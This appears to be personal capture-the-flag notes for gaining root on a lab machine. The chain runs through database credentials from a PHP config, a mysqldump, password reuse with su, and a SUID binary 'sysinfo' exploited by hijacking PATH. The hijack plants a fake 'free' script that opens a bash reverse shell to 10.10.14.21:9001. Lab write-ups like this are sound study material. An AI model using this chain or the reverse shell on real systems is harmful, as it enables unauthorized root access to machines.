# Getting Root

![[Pasted image 20211204224830.png]]
```bash
 	private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus
```

Dump SQL
```bash
mysqldump -u theseus -p Magic
```
![[Pasted image 20211204235320.png]]
Creds: admin:Th3s3usW4sK1ng

```bashh
$ su - theseus
```
pass:Th3s3usW4sK1ng


```bash
theseus@ubuntu:~$ find / -group users 2>/dev/null
/bin/sysinfo
theseus@ubuntu:~$ ls -la /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinf
```

-f = follow fork
```bash
strace -f sysinfo
```
![[Pasted image 20211205085822.png]]

Export PATH to hijack relative path of free binary
Content of create free
```bash
theseus@ubuntu:/dev/shm$ vi free                                                               
theseus@ubuntu:/dev/shm$ chmod +x free
$ cat free
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1
```


```bash
theseus@ubuntu:/dev/shm$ ls                                                                                                                                                                   
theseus@ubuntu:/dev/shm$ echo $PATH                                                                                                                                                           
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                            
theseus@ubuntu:/dev/shm$ vi free                                                                                                                                                              
theseus@ubuntu:/dev/shm$ chmod +x free                                                                                                                                                        
                                                                                                                                   
theseus@ubuntu:/dev/shm$ export "PATH=$(pwd):/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"                                              
theseus@ubuntu:/dev/shm$ echo $PATH                                                                                                                                                           
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                   
theseus@ubuntu:/dev/shm$ sysinfo
```

![[Pasted image 20211205090718.png]]

